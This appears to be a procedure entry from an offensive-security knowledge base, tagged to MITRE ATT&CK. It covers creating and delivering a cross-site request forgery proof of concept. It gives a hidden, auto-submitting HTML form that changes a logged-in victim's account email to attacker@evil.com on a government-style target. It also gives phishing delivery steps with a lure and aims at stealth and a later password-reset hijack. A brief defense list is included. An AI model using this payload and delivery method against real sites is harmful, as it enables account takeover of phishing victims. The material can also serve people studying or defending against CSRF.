---
id: p1q2r3s4-t5u6-7890-bcde-f12345678901
name: Create-and-Deliver-CSRF-PoC
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.288Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - csrf
  - poc-creation
  - social-engineering
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Create-and-Deliver-CSRF-PoC

## Summary

This procedure involves crafting a malicious HTML file that exploits the lack of CSRF protection on an account email change endpoint, tricking an authenticated victim into submitting a forged POST request to modify their account details without consent.

## Description

In scenarios targeting web applications without CSRF tokens, such as the DoD application's account update form, attackers create a proof-of-concept (PoC) HTML file with an auto-submitting form. The form targets the vulnerable endpoint (e.g., POST /account/update) and sets fields like email to attacker-controlled values. Delivery occurs via phishing email or malicious link, executing only when the victim is logged into the target site. Prerequisites include identifying the endpoint URL and form parameters through manual inspection or proxy tools. Expected outcome: Silent account modification enabling further compromise.

## Requirements

1. Access to the target's account update endpoint URL and form parameters (e.g., via browser inspection)
2. Victim's authentication session active in the browser
3. Social engineering vector (e.g., email) to deliver the HTML file
4. Attacker's controlled email address for the payload

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing forms
- Use SameSite cookies and Content-Security-Policy headers to mitigate cross-site requests
- Monitor for anomalous account changes and alert on email modifications

## Objectives

1. Forge and submit a POST request to alter account email
2. Maintain stealth by avoiding user-visible interactions
3. Set up for password reset hijacking

## Instructions

### Step 1: Inspect and Identify Vulnerable Endpoint

**Context**: Use browser developer tools to capture the account update form's action URL and input names (e.g., 'email' field).

Navigate to the account settings while authenticated, right-click the email change form, and inspect the HTML. Note the POST endpoint (e.g., https://target.gov/account/update) and parameters.

### Step 2: Craft the Malicious HTML PoC

**Context**: Create an HTML file with a hidden form that auto-submits the forged request.

Create a file named csrf_POC.html with the following content, replacing placeholders with real values:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://target.gov/account/update" method="POST" style="display:none;">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="other_field" value="modified_value">
</form>
<script>
  document.getElementById("csrfForm").submit();
</script>
</body>
</html>
```

> This script auto-submits the form on load, forging the request from the victim's browser.

### Step 3: Deliver to Victim

**Context**: Trick the victim into opening the file while authenticated.

Send the HTML file as an attachment via email with a lure (e.g., "Review this document"). Ensure the victim opens it in a browser tab while logged into the target site.

**Expected Output**: No visible popup; request submits in background.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[csrf]]
- [[web-exploitation]]
